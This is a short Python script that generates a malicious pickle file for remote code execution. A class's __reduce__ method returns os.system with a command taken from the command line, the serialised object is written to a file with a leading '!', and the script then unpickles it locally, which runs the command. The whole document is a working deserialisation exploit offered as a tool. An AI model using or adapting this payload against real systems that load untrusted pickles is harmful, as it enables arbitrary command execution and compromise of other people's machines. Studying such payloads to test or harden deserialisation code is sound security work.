#!/usr/bin/python

import pickle as cPickle
import sys
import base64

COMMAND = sys.argv[1]

print(COMMAND)

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

test=cPickle.dumps(PickleRce())
f = open(sys.argv[2], 'wb')
f.write('!'.encode('ascii'))
f.write(test)
f.close()

cPickle.loads(test)